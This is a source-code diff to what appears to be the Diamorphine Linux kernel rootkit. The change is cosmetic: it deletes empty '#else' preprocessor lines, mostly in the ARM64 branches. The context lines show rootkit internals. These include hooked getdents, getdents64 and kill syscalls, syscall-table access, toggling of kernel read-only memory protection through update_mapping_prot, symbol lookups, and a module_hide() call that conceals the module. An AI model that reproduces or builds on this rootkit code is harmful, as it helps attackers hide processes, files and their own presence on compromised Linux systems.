@@ -38,7 +38,6 @@ void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t si
 unsigned long start_rodata;
 unsigned long init_begin;
 #define section_size    init_begin - start_rodata
-#else
 #endif
 static unsigned long *__sys_call_table;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -112,7 +111,6 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #elif IS_ENABLED(CONFIG_ARM64)
 		int fd = (int) pt_regs->regs[0];
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#else
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
@@ -179,7 +177,6 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #elif IS_ENABLED(CONFIG_ARM64)
 		int fd = (int) pt_regs->regs[0];
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#else
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
@@ -314,7 +311,6 @@ hacked_kill(const struct pt_regs *pt_regs)
 #elif IS_ENABLED(CONFIG_ARM64)
         pid_t pid = (pid_t) pt_regs->regs[0];
         int sig = (int) pt_regs->regs[1];
-#else
 #endif
 #else
 asmlinkage int
@@ -371,7 +367,6 @@ protect_memory(void)
     update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			    section_size, PAGE_KERNEL_RO);
 
-#else
 #endif
 }
 
@@ -387,7 +382,6 @@ unprotect_memory(void)
 #elif IS_ENABLED(CONFIG_ARM64)
     update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			    section_size, PAGE_KERNEL);
-#else
 #endif
 }
 
@@ -404,7 +398,6 @@ diamorphine_init(void)
     update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
     start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
     init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
-#else
 #endif
 
 	module_hide();
